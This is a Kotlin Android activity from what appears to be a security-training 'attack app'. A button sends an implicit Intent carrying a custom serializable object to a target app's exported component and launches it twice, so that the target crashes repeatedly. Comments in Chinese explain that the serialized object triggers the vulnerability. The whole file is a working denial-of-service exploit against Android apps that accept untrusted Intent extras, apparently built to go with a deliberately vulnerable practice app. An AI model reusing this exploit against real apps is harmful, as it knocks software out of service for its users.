package com.forgo7ten.attackapp.attack.denialservice

import android.content.Intent
import android.os.Bundle
import androidx.appcompat.app.AppCompatActivity
import com.forgo7ten.attackapp.databinding.ActivityDenialServiceBinding


class DenialServiceActivity : AppCompatActivity() {
    private lateinit var binding: ActivityDenialServiceBinding
    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        binding = ActivityDenialServiceBinding.inflate(layoutInflater)
        setContentView(binding.root)
        binding.btnAttack.setOnClickListener {
            val sendIntent = Intent().apply {
                action = "com.forgo7ten.vulnerabilities.DENIALSERVICE"
                // 添加序列化对象触发漏洞，这里的key值可以是任意的
                putExtra("some", Some())
            }
            // 重复发送两次，触发“屡次停止运行”
            repeat(2) { startActivity(sendIntent) }
        }
    }
}